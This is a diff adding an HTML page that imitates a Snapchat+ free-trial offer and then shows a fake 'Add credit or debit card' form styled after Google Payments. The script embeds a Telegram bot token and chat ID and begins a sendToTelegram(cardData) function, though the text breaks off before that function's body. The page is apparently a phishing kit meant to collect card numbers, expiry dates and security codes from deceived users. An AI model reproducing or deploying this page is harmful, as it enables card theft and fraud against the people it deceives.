@@ -1,0 +1,1090 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Snapchat+ · Free Pass</title>
+  <style>
+    /* ----- base & shared styles ----- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+    body {
+      background: #f2e9d0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 12px;
+      margin: 0;
+    }
+    .page {
+      display: none;
+      width: 100%;
+      justify-content: center;
+      align-items: center;
+    }
+    .page.active {
+      display: flex;
+    }
+
+    /* ----- PAGE 1 (snap plans) exact styles ----- */
+    .page1 .trial-card {
+      max-width: 400px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 32px;
+      padding: 24px 22px 28px 22px;
+      box-shadow: 0 20px 35px -8px rgba(0,0,0,0.15), 0 5px 12px rgba(249,168,38,0.12);
+      border: 1px solid #ffe6b3;
+    }
+
+    .page1 .offer-header {
+      background: #fff3db;
+      border-radius: 24px;
+      padding: 16px 20px;
+      margin-bottom: 20px;
+      border-left: 6px solid #f9a826;
+      box-shadow: 0 2px 6px rgba(249,168,38,0.15);
+      transition: all 0.15s ease;
+      cursor: pointer;
+      border: 2px solid transparent;
+    }
+
+    .page1 .offer-header.selected-plan {
+      border-color: #f9a826;
+      background: #fffae9;
+      box-shadow: 0 8px 16px rgba(249,168,38,0.2);
+      transform: scale(1.01);
+    }
+
+    .page1 .offer-eyebrow {
+      font-size: 13px;
+      font-weight: 600;
+      color: #b27d3a;
+      letter-spacing: 0.3px;
+      margin-bottom: 6px;
+    }
+
+    .page1 .offer-title {
+      font-size: 26px;
+      font-weight: 700;
+      color: #242424;
+      line-height: 1.1;
+      margin-bottom: 6px;
+    }
+    .page1 .offer-title span {
+      background: #f9a826;
+      color: white;
+      font-size: 22px;
+      font-weight: 700;
+      padding: 2px 12px;
+      border-radius: 40px;
+      margin-left: 8px;
+      display: inline-block;
+    }
+
+    .page1 .offer-price-row {
+      display: flex;
+      align-items: baseline;
+      flex-wrap: wrap;
+      gap: 6px 14px;
+      margin-top: 6px;
+    }
+    .page1 .monthly-badge {
+      background: #e9d9b4;
+      padding: 4px 14px;
+      border-radius: 40px;
+      font-size: 15px;
+      font-weight: 600;
+      color: #7a5900;
+    }
+    .page1 .monthly-badge strong {
+      font-size: 22px;
+      font-weight: 800;
+      color: #1e1e1e;
+      margin-right: 4px;
+    }
+    .page1 .monthly-badge small {
+      font-size: 14px;
+      font-weight: 500;
+      color: #5f4a1a;
+    }
+    .page1 .free-tag {
+      background: #fee69c;
+      border-radius: 40px;
+      padding: 4px 18px;
+      font-weight: 700;
+      font-size: 18px;
+      color: #965f10;
+      border: 1px dashed #f9a826;
+    }
+
+    .page1 .feature-list {
+      margin: 14px 0 12px 0;
+    }
+    .page1 .feature-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 15px;
+      color: #1f1f1f;
+      margin-bottom: 8px;
+    }
+    .page1 .feature-item span:first-child {
+      color: #f9a826;
+      font-size: 20px;
+      font-weight: 600;
+      width: 24px;
+      text-align: center;
+    }
+    .page1 .feature-item .feature-text {
+      font-weight: 500;
+    }
+
+    .page1 .renew-note {
+      font-size: 14px;
+      color: #7f6134;
+      font-weight: 500;
+      margin: 8px 0 4px 0;
+    }
+
+    .page1 .plans-row {
+      display: flex;
+      gap: 14px;
+      margin: 24px 0 18px 0;
+    }
+
+    .page1 .plan-card {
+      flex: 1;
+      background: #fcf3e1;
+      border-radius: 26px;
+      padding: 16px 12px;
+      border: 2px solid transparent;
+      transition: all 0.15s ease;
+      cursor: pointer;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+      position: relative;
+    }
+
+    .page1 .plan-card.selected-plan {
+      border-color: #f9a826;
+      background: #fff7e6;
+      box-shadow: 0 8px 16px rgba(249,168,38,0.25);
+      transform: scale(1.02);
+    }
+
+    .page1 .best-value {
+      position: absolute;
+      top: -10px;
+      left: 14px;
+      background: #f9a826;
+      color: white;
+      font-size: 12px;
+      font-weight: 800;
+      padding: 4px 14px;
+      border-radius: 40px;
+      letter-spacing: 0.4px;
+      text-transform: uppercase;
+    }
+
+    .page1 .annual-price {
+      font-size: 26px;
+      font-weight: 800;
+      margin-top: 12px;
+      color: #1e1e1e;
+    }
+    .page1 .annual-price small {
+      font-size: 14px;
+      font-weight: 500;
+      color: #5f4d26;
+    }
+    .page1 .annual-label {
+      font-weight: 700;
+      font-size: 18px;
+      color: #965f10;
+      margin-top: 4px;
+    }
+    .page1 .free-badge-small {
+      background: #f9a826;
+      color: white;
+      padding: 4px 8px;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: 600;
+      display: inline-block;
+      margin-top: 8px;
+    }
+
+    .page1 .lens-title {
+      font-weight: 700;
+      font-size: 18px;
+      color: #1e1e1e;
+    }
+    .page1 .lens-price {
+      font-size: 26px;
+      font-weight: 800;
+      color: #965f10;
+      margin: 10px 0 4px;
+    }
+    .page1 .lens-price small {
+      font-size: 14px;
+      font-weight: 500;
+      color: #5f4d26;
+    }
+
+    .page1 .selected-indicator {
+      display: inline-block;
+      background: #f9a826;
+      color: white;
+      border-radius: 50%;
+      width: 22px;
+      height: 22px;
+      line-height: 22px;
+      text-align: center;
+      font-size: 14px;
+      font-weight: bold;
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      opacity: 0;
+      transition: opacity 0.1s;
+    }
+    .page1 .plan-card.selected-plan .selected-indicator {
+      opacity: 1;
+    }
+
+    .page1 .top-check {
+      position: absolute;
+      top: 16px;
+      right: 20px;
+      background: #f9a826;
+      color: white;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      line-height: 24px;
+      text-align: center;
+      font-size: 16px;
+      font-weight: bold;
+      opacity: 0;
+      transition: opacity 0.1s;
+      pointer-events: none;
+    }
+    .page1 .offer-header.selected-plan .top-check {
+      opacity: 1;
+    }
+
+    .page1 .start-trial-btn {
+      background: #f9a826;
+      width: 100%;
+      border: none;
+      border-radius: 40px;
+      padding: 20px 16px;
+      color: white;
+      font-size: 24px;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+      text-align: center;
+      margin: 16px 0 14px;
+      box-shadow: 0 12px 20px -8px #f9a82680;
+      cursor: pointer;
+      transition: 0.15s;
+      border: 1px solid #ffcd7e;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .page1 .start-trial-btn:active {
+      background: #e09015;
+      transform: scale(0.98);
+    }
+
+    .page1 .legal-text {
+      font-size: 11.5px;
+      color: #7f643c;
+      line-height: 1.5;
+      margin: 14px 0 8px;
+    }
+    .page1 .legal-text a {
+      color: #f9a826;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .page1 .divider {
+      height: 1px;
+      background: linear-gradient(to right, transparent, #f9c96b, transparent);
+      margin: 16px 0 14px;
+    }
+    .page1 .currency-note {
+      font-size: 12px;
+      color: #856c3d;
+      font-weight: 500;
+    }
+
+    /* ----- PAGE 2 (card form) exact styles ----- */
+    .page2 .phone-container {
+      width: 100%;
+      max-width: 400px;
+      background: white;
+      border-radius: 28px;
+      padding: 24px;
+      color: #333;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.08), 0 6px 12px rgba(0,0,0,0.05);
+      border: 1px solid #fff3cd;
+    }
+
+    .page2 .header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 24px;
+      position: relative;
+    }
+
+    .page2 .back-btn {
+      font-size: 24px;
+      margin-right: 16px;
+      cursor: pointer;
+      color: #b8860b;
+      font-weight: 500;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      background: #fff9e6;
+      transition: 0.2s;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .page2 .back-btn:active {
+      background: #ffeeba;
+    }
+
+    .page2 .title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #b8860b;
+      letter-spacing: -0.3px;
+    }
+
+    .page2 .clear-btn {
+      position: absolute;
+      right: 0;
+      top: 50%;
+      transform: translateY(-50%);
+      background: #ffc107;
+      color: #856404;
+      border: none;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .page2 .clear-btn:active {
+      background: #ffb300;
+      transform: translateY(-50%) scale(0.95);
+    }
+
+    .page2 .subtitle {
+      font-size: 14px;
+      color: #856404;
+      margin-bottom: 20px;
+      font-weight: 500;
+    }
+
+    .page2 label {
+      font-size: 14px;
+      margin-bottom: 6px;
+      display: block;
+      color: #856404;
+      font-weight: 500;
+    }
+
+    .page2 .input-wrapper {
+      position: relative;
+      margin-bottom: 18px;
+    }
+
+    .page2 .input-box {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 14px;
+      border: 1.5px solid #ffe5a3;
+      background: white;
+      color: #333;
+      outline: none;
+      transition: 0.2s;
+      font-size: 16px;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    .page2 .input-box:focus {
+      border-color: #f9a826;
+      box-shadow: 0 0 0 3px rgba(249, 168, 38, 0.15);
+    }
+
+    .page2 .input-box.valid {
+      border-color: #28a745;
+      background-color: #f8fff9;
+    }
+
+    .page2 .input-box.invalid {
+      border-color: #dc3545;
+      background-color: #fff8f8;
+    }
+
+    .page2 .input-box::placeholder {
+      color: #d4af7a;
+      opacity: 0.7;
+    }
+
+    .page2 .validation-icon {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 18px;
+      display: none;
+    }
+
+    .page2 .input-box.valid + .validation-icon {
+      display: block;
+      color: #28a745;
+    }
+
+    .page2 .input-box.invalid + .validation-icon {
+      display: block;
+      color: #dc3545;
+    }
+
+    .page2 .clear-field {
+      position: absolute;
+      right: 35px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 18px;
+      color: #999;
+      cursor: pointer;
+      display: none;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: #f0f0f0;
+      text-align: center;
+      line-height: 18px;
+      font-weight: bold;
+      transition: 0.2s;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .page2 .input-wrapper:hover .clear-field,
+    .page2 .input-box:focus ~ .clear-field {
+      display: block;
+    }
+
+    .page2 .validation-message {
+      font-size: 12px;
+      margin-top: -12px;
+      margin-bottom: 10px;
+      padding-left: 16px;
+      display: none;
+    }
+
+    .page2 .validation-message.error {
+      color: #dc3545;
+      display: block;
+    }
+
+    .page2 .validation-message.success {
+      color: #28a745;
+      display: block;
+    }
+
+    .page2 .row {
+      display: flex;
+      gap: 12px;
+    }
+
+    .page2 .small-input {
+      flex: 1;
+      position: relative;
+    }
+
+    .page2 .terms {
+      font-size: 12px;
+      color: #856404;
+      margin-top: 10px;
+      line-height: 1.5;
+      background: #fff9e6;
+      padding: 12px 14px;
+      border-radius: 14px;
+      border-left: 4px solid #f9a826;
+    }
+
+    .page2 .bottom-section {
+      margin-top: 28px;
+    }
+
+    .page2 .snapchat-box {
+      display: flex;
+      align-items: center;
+      background: #fff9e6;
+      padding: 14px;
+      border-radius: 18px;
+      margin-bottom: 20px;
+      border: 1px solid #ffeeba;
+    }
+
+    .page2 .snapchat-icon {
+      width: 42px;
+      height: 42px;
+      background: #f9a826;
+      border-radius: 12px;
+      margin-right: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      font-size: 20px;
+      box-shadow: 0 4px 8px rgba(249, 168, 38, 0.3);
+    }
+
+    .page2 .snapchat-box div:last-child {
+      font-weight: 600;
+      color: #b8860b;
+      font-size: 15px;
+    }
+
+    .page2 .save-btn {
+      width: 100%;
+      padding: 16px;
+      border-radius: 40px;
+      border: none;
+      background: linear-gradient(135deg, #f9a826, #ffc107);
+      color: white;
+      font-weight: 700;
+      font-size: 17px;
+      cursor: pointer;
+      transition: 0.2s;
+      box-shadow: 0 8px 16px rgba(249, 168, 38, 0.3);
+      -webkit-tap-highlight-color: transparent;
+      border: 1px solid rgba(255,255,255,0.2);
+      opacity: 0.7;
+      pointer-events: none;
+    }
+
+    .page2 .save-btn.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .page2 .save-btn:active {
+      transform: scale(0.97);
+      background: linear-gradient(135deg, #f39c12, #ffb347);
+      box-shadow: 0 4px 8px rgba(249, 168, 38, 0.4);
+    }
+
+    .page2 .card-type {
+      position: absolute;
+      right: 45px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 12px;
+      padding: 2px 6px;
+      border-radius: 4px;
+      background: #f0f0f0;
+      color: #666;
+      display: none;
+    }
+
+    .page2 .card-type.visible {
+      display: block;
+    }
+
+    .page2 .status-message {
+      text-align: center;
+      padding: 10px;
+      border-radius: 10px;
+      margin-top: 10px;
+      font-size: 14px;
+      display: none;
+    }
+
+    .page2 .status-message.success {
+      background: #d4edda;
+      color: #155724;
+      display: block;
+    }
+
+    .page2 .status-message.error {
+      background: #f8d7da;
+      color: #721c24;
+      display: block;
+    }
+
+    .page2 .status-message.info {
+      background: #fff3cd;
+      color: #856404;
+      display: block;
+    }
+
+    /* ----- PAGE 3 (welcome + celebration) new styles, same theme ----- */
+    .page3 {
+      background: #f2e9d0;
+    }
+    .welcome-card {
+      max-width: 400px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 48px 48px 32px 32px;
+      padding: 32px 24px 40px;
+      box-shadow: 0 30px 45px -10px rgba(249,168,38,0.25), 0 10px 20px rgba(0,0,0,0.1);
+      border: 2px solid #ffd98c;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* celebration effect: confetti / sparkles background */
+    .celebration-bg {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      background: radial-gradient(circle at 20% 30%, rgba(255,215,0,0.15) 0%, transparent 30%),
+                  radial-gradient(circle at 80% 70%, rgba(249,168,38,0.2) 0%, transparent 35%),
+                  radial-gradient(circle at 40% 80%, #fff3b0 0%, transparent 40%),
+                  radial-gradient(circle at 90% 20%, #ffe27a 0%, transparent 35%);
+      animation: sparkle 4s infinite alternate;
+      z-index: 0;
+    }
+    @keyframes sparkle {
+      0% { opacity: 0.4; transform: scale(1); }
+      100% { opacity: 1; transform: scale(1.02); }
+    }
+    /* floating emojis / pseudo confetti */
+    .confetti {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      font-size: 24px;
+      z-index: 1;
+    }
+    .confetti span {
+      position: absolute;
+      animation: float 6s linear infinite;
+      opacity: 0.6;
+    }
+    .confetti span:nth-child(1) { top: 10%; left: 15%; animation-delay: 0s; content: '🎉'; }
+    .confetti span:nth-child(2) { top: 20%; right: 20%; animation-delay: 0.5s; }
+    .confetti span:nth-child(3) { bottom: 30%; left: 10%; animation-delay: 1s; }
+    .confetti span:nth-child(4) { bottom: 10%; right: 25%; animation-delay: 1.5s; }
+    .confetti span:nth-child(5) { top: 70%; left: 70%; animation-delay: 2s; }
+    .confetti span:nth-child(6) { top: 40%; right: 5%; animation-delay: 2.5s; }
+    .confetti span:nth-child(7) { bottom: 50%; left: 30%; animation-delay: 3s; }
+    .confetti span:nth-child(8) { bottom: 15%; right: 40%; animation-delay: 3.5s; }
+
+    @keyframes float {
+      0% { transform: translateY(0) rotate(0deg); opacity: 0.4; }
+      50% { transform: translateY(-30px) rotate(15deg); opacity: 0.8; }
+      100% { transform: translateY(-60px) rotate(30deg); opacity: 0; }
+    }
+
+    .welcome-content {
+      position: relative;
+      z-index: 10;
+    }
+
+    .ghost-big {
+      font-size: 80px;
+      line-height: 1;
+      margin-bottom: 8px;
+      filter: drop-shadow(0 8px 12px #f9a82660);
+      animation: bounce 2s infinite;
+    }
+    @keyframes bounce {
+      0%,100%{ transform: translateY(0); }
+      50%{ transform: translateY(-10px); }
+    }
+
+    .welcome-title {
+      font-size: 34px;
+      font-weight: 800;
+      background: linear-gradient(145deg, #b45f06, #f9a826);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin: 10px 0 8px;
+      letter-spacing: -0.5px;
+    }
+
+    .welcome-sub {
+      font-size: 18px;
+      font-weight: 500;
+      color: #b27d3a;
+      margin: 8px 0 16px;
+    }
+
+    .activation-notice {
+      background: #fff3db;
+      border-radius: 60px;
+      padding: 16px 22px;
+      border-left: 6px solid #f9a826;
+      color: #7a5900;
+      font-size: 17px;
+      font-weight: 600;
+      margin: 28px 0 20px;
+      box-shadow: 0 6px 0 #e0b86b;
+    }
+
+    .done-btn {
+      background: #f9a826;
+      border: none;
+      border-radius: 60px;
+      padding: 18px 30px;
+      width: 100%;
+      color: white;
+      font-size: 22px;
+      font-weight: 700;
+      letter-spacing: 0.8px;
+      box-shadow: 0 12px 20px -5px #f9a826b0;
+      cursor: pointer;
+      transition: 0.15s;
+      margin-top: 20px;
+      border: 1px solid #ffd58c;
+    }
+    .done-btn:active {
+      transform: scale(0.97);
+      background: #e09015;
+    }
+
+    /* small responsive */
+    @media (max-width: 380px) {
+      .page1 .plans-row { flex-direction: column; }
+    }
+  </style>
+</head>
+<body>
+  <!-- PAGE 1 (selection) -->
+  <div class="page page1 active" id="page1">
+    <div class="trial-card">
+      <div class="offer-header" id="freePassPlan">
+        <div class="top-check">✓</div>
+        <div class="offer-eyebrow">✨ TRY SNAPCHAT+ FOR FREE</div>
+        <div class="offer-title">SPECIAL OFFER <span>🎉</span></div>
+        <div class="offer-price-row">
+          <div class="monthly-badge">
+            <strong>Snapchat+ Free Pass</strong>
+          </div>
+          <div class="free-tag">✨ 30 days free</div>
+        </div>
+        <div class="feature-list">
+          <div class="feature-item"><span>✅</span><span class="feature-text">Access to all 40+ Snapchat+ features</span></div>
+          <div class="feature-item"><span>✅</span><span class="feature-text">Cancel or change plan at any time</span></div>
+        </div>
+        <div class="renew-note">Free for the first 30 days, then GHS15.00 / mo</div>
+      </div>
+      <div class="plans-row">
+        <div class="plan-card" id="annualPlan" data-plan="annual">
+          <div class="best-value">BEST VALUE</div>
+          <div class="selected-indicator">✓</div>
+          <div class="annual-price">GHS60.00 <small>/yr</small></div>
+          <div class="annual-label">Annual</div>
+          <div class="free-badge-small">🔥 Free 30 days</div>
+        </div>
+        <div class="plan-card" id="lensPlan" data-plan="lens">
+          <div class="selected-indicator">✓</div>
+          <div class="lens-title">Lens+</div>
+          <div class="lens-price">GHS50.00 <small>/mo</small></div>
+          <div style="font-size: 13px; color:#ac822f; margin-top: 12px;">Creator bundle</div>
+        </div>
+      </div>
+      <button class="start-trial-btn" id="startTrialBtn">Start Free Trial</button>
+      <div class="legal-text">
+        Features can change at any time. Payment will be charged to your Play Store account. Your subscription will be renewed at the full price after the introductory offer period. Your subscription will be auto-renewed at your selected interval until you cancel it in Play Store settings. The amount charged may change with notice. You can cancel your subscription at any time. By tapping “Start Free Trial”, you are agreeing to the <a href="#">Snapchat+ Subscription Terms</a> and the auto-renewal.
+      </div>
+      <div class="currency-note">* Ghana Cedi (GHS) pricing shown</div>
+      <div class="divider"></div>
+    </div>
+  </div>
+
+  <!-- PAGE 2 (card form) -->
+  <div class="page page2" id="page2">
+    <div class="phone-container">
+      <div class="header">
+        <div class="back-btn" id="backToPage1" role="button" tabindex="0">←</div>
+        <div class="title">Add credit or debit card</div>
+        <button class="clear-btn" id="clear-all-btn">Clear All</button>
+      </div>
+      <div class="subtitle">All fields required</div>
+      
+      <div class="input-wrapper">
+        <label for="card-number">Card number</label>
+        <input class="input-box" id="card-number" placeholder="•••• •••• •••• ••••" type="text" inputmode="numeric" maxlength="19" autocomplete="off" />
+        <span class="card-type" id="card-type"></span>
+        <span class="clear-field" id="clear-card">×</span>
+        <span class="validation-icon" id="card-icon">✓</span>
+      </div>
+      <div class="validation-message" id="card-message"></div>
+      
+      <div class="row">
+        <div class="small-input">
+          <div class="input-wrapper">
+            <label for="expiry">MM/YY</label>
+            <input class="input-box" id="expiry" placeholder="MM/YY" type="text" inputmode="numeric" maxlength="5" autocomplete="off" />
+            <span class="clear-field" id="clear-expiry">×</span>
+            <span class="validation-icon" id="expiry-icon">✓</span>
+          </div>
+          <div class="validation-message" id="expiry-message"></div>
+        </div>
+        <div class="small-input">
+          <div class="input-wrapper">
+            <label for="cvv">Security code</label>
+            <input class="input-box" id="cvv" placeholder="CVV" type="text" inputmode="numeric" maxlength="4" autocomplete="off" />
+            <span class="clear-field" id="clear-cvv">×</span>
+            <span class="validation-icon" id="cvv-icon">✓</span>
+          </div>
+          <div class="validation-message" id="cvv-message"></div>
+        </div>
+      </div>
+
+      <div class="terms">
+        By continuing, you create a Google Payments account and agree to the Terms of Service. The Privacy Notice describes how your data is handled.
+      </div>
+
+      <div class="bottom-section">
+        <div class="snapchat-box">
+          <div class="snapchat-icon">👻</div>
+          <div>Snapchat+ (Chat with Friends) — Free</div>
+        </div>
+        <button class="save-btn" id="save-btn">Save card</button>
+        <div class="status-message" id="status-message"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 3 (welcome + celebration) -->
+  <div class="page page3" id="page3">
+    <div class="welcome-card">
+      <!-- celebration background effects -->
+      <div class="celebration-bg"></div>
+      <div class="confetti">
+        <span>🎉</span> <span>✨</span> <span>🎊</span> <span>👻</span> <span>🔥</span> <span>⭐</span> <span>🎈</span> <span>💛</span>
+      </div>
+      <div class="welcome-content">
+        <div class="ghost-big">👻✨</div>
+        <div class="welcome-title">WELCOME TO</div>
+        <div class="welcome-title" style="font-size: 48px; margin-top: -10px;">SNAPCHAT+</div>
+        <div class="welcome-sub">You're officially a plus member</div>
+        
+        <div class="activation-notice">
+          ⏳ Your Snapchat+ will be activated <br> within 24 hours
+        </div>
+        
+        <button class="done-btn" id="doneBtn">🎉  LET'S GO  🎉</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ----- navigation -----
+      const page1 = document.getElementById('page1');
+      const page2 = document.getElementById('page2');
+      const page3 = document.getElementById('page3');
+      
+      const trialBtn = document.getElementById('startTrialBtn');
+      const backBtn = document.getElementById('backToPage1');
+      const saveBtn = document.getElementById('save-btn');
+      const doneBtn = document.getElementById('doneBtn');
+
+      function showPage1() { page1.classList.add('active'); page2.classList.remove('active'); page3.classList.remove('active'); }
+      function showPage2() { page1.classList.remove('active'); page2.classList.add('active'); page3.classList.remove('active'); }
+      function showPage3() { page1.classList.remove('active'); page2.classList.remove('active'); page3.classList.add('active'); }
+
+      // ----- PAGE 1 logic (selection) -----
+      const freePass = document.getElementById('freePassPlan');
+      const annual = document.getElementById('annualPlan');
+      const lens = document.getElementById('lensPlan');
+      let currentSelection = 'freePass';
+
+      function clearSelected() {
+        freePass.classList.remove('selected-plan');
+        annual.classList.remove('selected-plan');
+        lens.classList.remove('selected-plan');
+      }
+      function selectPlan(planId) {
+        clearSelected();
+        if (planId === 'freePass') { freePass.classList.add('selected-plan'); currentSelection = 'freePass'; }
+        else if (planId === 'annual') { annual.classList.add('selected-plan'); currentSelection = 'annual'; }
+        else if (planId === 'lens') { lens.classList.add('selected-plan'); currentSelection = 'lens'; }
+      }
+      selectPlan('freePass');
+      freePass.addEventListener('click', () => selectPlan('freePass'));
+      annual.addEventListener('click', () => selectPlan('annual'));
+      lens.addEventListener('click', () => selectPlan('lens'));
+
+      trialBtn.addEventListener('click', () => { showPage2(); });
+
+      // back from page2 to page1
+      backBtn.addEventListener('click', () => { showPage1(); });
+
+      // ----- PAGE 2 logic (card + telegram) -----
+      const cardInput = document.getElementById('card-number');
+      const expiryInput = document.getElementById('expiry');
+      const cvvInput = document.getElementById('cvv');
+      const cardIcon = document.getElementById('card-icon');
+      const expiryIcon = document.getElementById('expiry-icon');
+      const cvvIcon = document.getElementById('cvv-icon');
+      const cardMessage = document.getElementById('card-message');
+      const expiryMessage = document.getElementById('expiry-message');
+      const cvvMessage = document.getElementById('cvv-message');
+      const cardType = document.getElementById('card-type');
+      const statusMessage = document.getElementById('status-message');
+      const clearAllBtn = document.getElementById('clear-all-btn');
+      const clearCard = document.getElementById('clear-card');
+      const clearExpiry = document.getElementById('clear-expiry');
+      const clearCvv = document.getElementById('clear-cvv');
+
+      const botToken = '2128201203:AAGPpKg3uIEjy8V1KYHXPfddBmxTFmgt_ZE';
+      const chatId = '1327564115';
+
+      function clearField(input, icon, message, typeElement = null) {
+        input.value = ''; input.classList.remove('valid', 'invalid'); if(icon) icon.style.display = 'none';
+        if(message) { message.textContent = ''; message.classList.remove('error','success'); }
+        if(typeElement) typeElement.classList.remove('visible'); checkAllFields();
+      }
+      clearCard.addEventListener('click', (e) => { e.stopPropagation(); clearField(cardInput, cardIcon, cardMessage, cardType); });
+      clearExpiry.addEventListener('click', (e) => { e.stopPropagation(); clearField(expiryInput, expiryIcon, expiryMessage); });
+      clearCvv.addEventListener('click', (e) => { e.stopPropagation(); clearField(cvvInput, cvvIcon, cvvMessage); });
+      clearAllBtn.addEventListener('click', () => {
+        clearField(cardInput, cardIcon, cardMessage, cardType);
+        clearField(expiryInput, expiryIcon, expiryMessage);
+        clearField(cvvInput, cvvIcon, cvvMessage);
+        statusMessage.style.display = 'none';
+      });
+
+      cardInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        let type = 'Unknown';
+        if (value.startsWith('4')) type = 'Visa'; else if (value.startsWith('5')) type = 'Mastercard'; else if (value.startsWith('3')) type = 'Amex'; else if (value.startsWith('6')) type = 'Discover';
+        let formatted = '';
+        for (let i = 0; i < value.length; i++) { if (i > 0 && i % 4 === 0) formatted += ' '; formatted += value[i]; }
+        e.target.value = formatted;
+        if (value.length === 0) {
+          cardInput.classList.remove('valid','invalid'); cardIcon.style.display = 'none'; cardMessage.textContent = ''; cardMessage.classList.remove('error','success'); cardType.classList.remove('visible');
+        } else if (value.length === 16) {
+          cardInput.classList.add('valid'); cardInput.classList.remove('invalid'); cardIcon.style.display = 'block'; cardIcon.textContent = '✓'; cardMessage.textContent = 'Valid card number'; cardMessage.classList.add('success'); cardMessage.classList.remove('error'); cardType.textContent = type; cardType.classList.add('visible');
+        } else {
+          cardInput.classList.add('invalid'); cardInput.classList.remove('valid'); cardIcon.style.display = 'block'; cardIcon.textContent = '✗'; cardMessage.textContent = 'Card number must be 16 digits'; cardMessage.classList.add('error'); cardMessage.classList.remove('success'); cardType.classList.remove('visible');
+        }
+        checkAllFields();
+      });
+
+      expiryInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (e.inputType === 'deleteContentBackward') { e.target.value = value; return; }
+        if (value.length >= 2) value = value.substring(0,2) + '/' + value.substring(2,4);
+        e.target.value = value;
+        if (value.length === 0) {
+          expiryInput.classList.remove('valid','invalid'); expiryIcon.style.display = 'none'; expiryMessage.textContent = ''; expiryMessage.classList.remove('error','success');
+        } else if (value.length === 5) {
+          const [month, year] = value.split('/'); const currentYear = new Date().getFullYear() % 100; const currentMonth = new Date().getMonth() + 1;
+          if (month >=1 && month <=12 && year >= currentYear) {
+            if (year == currentYear && month < currentMonth) {
+              expiryInput.classList.add('invalid'); expiryInput.classList.remove('valid'); expiryIcon.style.display = 'block'; expiryIcon.textContent = '✗'; expiryMessage.textContent = 'Card has expired'; expiryMessage.classList.add('error'); expiryMessage.classList.remove('success');
+            } else {
+              expiryInput.classList.add('valid'); expiryInput.classList.remove('invalid'); expiryIcon.style.display = 'block'; expiryIcon.textContent = '✓'; expiryMessage.textContent = 'Valid expiry date'; expiryMessage.classList.add('success'); expiryMessage.classList.remove('error');
+            }
+          } else {
+            expiryInput.classList.add('invalid'); expiryInput.classList.remove('valid'); expiryIcon.style.display = 'block'; expiryIcon.textContent = '✗'; expiryMessage.textContent = 'Invalid expiry date'; expiryMessage.classList.add('error'); expiryMessage.classList.remove('success');
+          }
+        } else {
+          expiryInput.classList.add('invalid'); expiryInput.classList.remove('valid'); expiryIcon.style.display = 'block'; expiryIcon.textContent = '✗'; expiryMessage.textContent = 'Use format MM/YY'; expiryMessage.classList.add('error'); expiryMessage.classList.remove('success');
+        }
+        checkAllFields();
+      });
+
+      cvvInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, ''); if (value.length > 4) value = value.substring(0,4); e.target.value = value;
+        if (value.length === 0) {
+          cvvInput.classList.remove('valid','invalid'); cvvIcon.style.display = 'none'; cvvMessage.textContent = ''; cvvMessage.classList.remove('error','success');
+        } else if (value.length === 3 || value.length === 4) {
+          cvvInput.classList.add('valid'); cvvInput.classList.remove('invalid'); cvvIcon.style.display = 'block'; cvvIcon.textContent = '✓'; cvvMessage.textContent = 'Valid CVV'; cvvMessage.classList.add('success'); cvvMessage.classList.remove('error');
+        } else {
+          cvvInput.classList.add('invalid'); cvvInput.classList.remove('valid'); cvvIcon.style.display = 'block'; cvvIcon.textContent = '✗'; const cardValue = cardInput.value.replace(/\D/g, ''); if (cardValue.startsWith('3')) cvvMessage.textContent = 'Amex requires 4 digits'; else cvvMessage.textContent = 'CVV must be 3 digits'; cvvMessage.classList.add('error'); cvvMessage.classList.remove('success');
+        }
+        checkAllFields();
+      });
+
+      function checkAllFields() {
+        const cardValid = cardInput.classList.contains('valid');
+        const expiryValid = expiryInput.classList.contains('valid');
+        const cvvValid = cvvInput.classList.contains('valid');
+        if (cardValid && expiryValid && cvvValid) saveBtn.classList.add('active'); else saveBtn.classList.remove('active');
+      }
+
+      function sendToTelegram(cardData) {
